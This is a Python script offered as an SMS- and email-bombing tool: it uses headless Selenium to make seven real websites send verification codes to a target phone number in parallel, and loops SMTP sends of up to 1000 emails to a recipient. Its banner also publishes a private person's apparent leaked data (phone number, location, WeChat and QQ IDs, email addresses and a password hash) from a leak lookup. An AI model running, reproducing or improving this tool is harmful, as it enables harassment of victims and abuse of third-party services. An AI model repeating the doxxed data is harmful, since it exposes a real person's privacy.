a = '''
                                                                                
                                                                                
                                                                                
             **                                                                 
             **   **********    ****************    *****************           
             **   **********    ****************    *****************           
             **        *****           **           ***                         
          ********    ****            ***           ***    ***                  
          ********   ****             ***           ***    ***                  # 0.1.0
             **    *****              ***           ***    ***                  
            ***   *****               ***           *** *************           
            **** ************  ******************   *** ************            
            *****************  ******************   ***    ***    **            
           **** ** *** *** **        *****          ***    ***    **            
           * ** *  **  **  **        ******         ***    ***    **            
          ** **   *** ***  **        ** ***         ***   ***     **            
          ** **   **  ***  **       ***  ***        ***   ***     **            
           * **  *** ****  **      ***   ***        **   ****     **            
          *  ** ***  ***  ***     ****    ***      ***   ***     ***            
             ** *** ****  ***    ****      ***     ***  ***      ***            
             **  * ****   ***   ****        ****   **  ****      ***            
             **   **** *****   ****          ****  ** ****   *******            
             **     *  ****     *             **   *   **    ******             
                                                                                
                                                                                
#Hash_9dff40232821c8

🏷️数据标签: 「 HashSGK_微信8亿绑定 」
微信原始ID：wxid_d19f3c8f458808
手机：18387759024 云南省普洱市 中国移动

🏷️数据标签: 「 HashSGK_SIM状态 」
手机：18387759024 云南省普洱市 中国移动
在网SIM卡:SIM手机卡
服务商：中国移动

🏷️数据标签: 「 HashSGK_邮箱 」
邮箱：18387759024@163.com
密码MD5：fdb9505477c15a6a00a7d61e4436d858
手机：18387759024 云南省普洱市 中国移动

🏷️数据标签: 「 HashSGK_邮箱 」
邮箱：3556276945@qq.com
手机：18387759024 云南省普洱市 中国移动

🏷️数据标签: 「 HashSGK_17亿qq绑定 」
qq:3556276945
手机：18387759024 云南省普洱市 中国移动      



####### 
#  by ：不公开 
#  留言； 我爱白洲梓，我永远喜欢你！ 无论它们怎么黑你，我一直都会爱你！
#   fw qq:3556276945
#           8/14---8/15
# ######

                                                                                
 ########                                                                                                              
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
'''
print(a)
from selenium import webdriver
from selenium.webdriver.common.by import By
import time
import threading

# 优化点：将webdriver.EdgeOptions()和webdriver.Edge()的创建移到函数外，避免重复创建
option = webdriver.EdgeOptions()
option.add_argument('headless')
browser = webdriver.Edge(options=option)

# 拍拍贷
def send_paipai(phon_num):
    try:
        browser.get("https://account.ppdai.com/pc/login")
        time.sleep(3)
        browser.find_element(By.ID, "login_returnSms").click()
        browser.find_element(By.ID, "Mobile").send_keys(phon_num)
        browser.find_element(By.ID, "btnSendSms").click()
        time.sleep(2)
    except Exception as e:
        print(f"拍拍贷发送失败: {e}")

# 巨人网络
def send_juren(phon_num):
    try:
        browser.get('https://reg.ztgame.com/')
        time.sleep(3)
        browser.find_element(By.CSS_SELECTOR, '[jslog-trace-id="phone"]').send_keys(phon_num)
        browser.find_element(By.NAME, 'get_mpcode').click()
        time.sleep(3)
    except Exception as e:
        print(f"巨人网络发送失败: {e}")

# 四川航空
def send_chuanhang(phon_num):
    try:
        browser.get('https://flights.sichuanair.com/3uair/ibe/profile/createProfile.do')
        time.sleep(3)
        browser.find_element(By.NAME, 'mobilePhone').send_keys(phon_num)
        browser.find_element(By.ID, "sendSmsCode").click()
        time.sleep(2)
    except Exception as e:
        print(f"四川航空发送失败: {e}")

# 武商网
def send_wushang(phon_num):
    try:
        browser.get('https://www.wushang.com/register/')
        time.sleep(5)
        browser.find_element(By.XPATH,'//input[@placeholder="输入手机号"]').send_keys(phon_num)
        time.sleep(2)
        browser.find_element(By.ID, 'inner_61a9647a-f874-4a7d-a3d2-d02b52011280').click()
        time.sleep(2)
    except Exception as e:
        print(f"武商网发送失败: {e}")

# 彩云科技
def send_caiyun(phon_num):
    try:
        browser.get("https://caiyunapp.com/user/login/")
        time.sleep(5)
        browser.find_element(By.ID, "phonenum").send_keys(phon_num)
        time.sleep(1)
        browser.find_element(By.ID, "second").click()
        time.sleep(2)
    except Exception as e:
        print(f"彩云科技发送失败: {e}")

# php中文网
def send_phpzw(phon_num):
    try:
        browser.get("https://m.php.cn/login")
        time.sleep(3)
        browser.find_element(By.ID, "telphone_login").send_keys(phon_num)
        browser.find_element(By.ID, "user_phone_code_button").click()
        time.sleep(2)
    except Exception as e:
        print(f"php中文网发送失败: {e}")

# spump
def send_spump(phon_num):
    try:
        browser.get("https://v3.cnppump.ltd/#/CN/login/tel?utp=0")
        time.sleep(4)
        browser.find_element(By.ID, 'sign-up-btn').click()
        time.sleep(2)
        browser.find_element(By.XPATH,'//input[@placeholder="请输入手机号"]').send_keys(phon_num)
        browser.find_element(By.CLASS_NAME, "el-button").click()
        time.sleep(2)
    except Exception as e:
        print(f"spump发送失败: {e}")

# 优化点：将线程的创建和启动合并到一个循环中，减少冗余代码
def start_threads(phon_num):
    functions = [send_paipai, send_juren, send_chuanhang, send_wushang, send_caiyun, send_phpzw, send_spump]
    threads = []
    for func in functions:
        t = threading.Thread(target=func, args=(phon_num,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

if __name__ == "__main__":
    print("     -s短信轰炸            -m邮件轰炸 ")
    input_str = input("请输入指令：")
    if input_str == "-m":
        import time
        import smtplib
        from email.mime.multipart import MIMEMultipart
        from email.mime.text import MIMEText
        from email.header import Header

        smtpserver = 'smtp.163.com'  # SMTP服务器地址
        username = 'username@163.com'  # 用户名
        password = 'password'  # 密码
        sender = 'username@163.com'  # 发件人
        receiver = ['username@qq.com']  # 收件人

        # receiver = ['username1@qq.com', 'username2@163.com']

        msg = MIMEMultipart('mixed')
        subject = '发送主题'
        subject = Header(subject, 'utf-8').encode()
        msg['Subject'] = subject
        msg['From'] = 'username <username@163.com>'
        msg['To'] = 'username <username@163.com>'
        # msg['To'] = 'username1 <username1@163.com>; username2 <username2@163.com>'
        import datetime
        msg['Date'] = datetime.datetime.now().strftime('%Y-%m-%d')

        text = "邮件正文"
        text_plain = MIMEText(text, 'plain', 'utf-8')
        msg.attach(text_plain)

        total = 1000
        send = 0
        error = 0
        while error < 10 and send < total:
            try:
                smtp = smtplib.SMTP()
                smtp.connect('smtp.163.com')
                smtp.login(username, password)
                while send < total:
                    smtp.sendmail(sender, receiver, msg.as_string())
                    print("第{}封邮件发送成功！".format(send+1))
                    send += 1
                    error = 0
                    time.sleep(60)
                smtp.quit()
            except smtplib.SMTPException as e:
                print("发生错误，重新发送:", e)
                error += 1
                continue

        print("发送完成！")
    else:
        phon_num = input('请输入手机号码：')
        start_threads(phon_num)
        print("已发送完成")
        browser.quit()  # 优化点：确保浏览器在所有操作完成后关闭



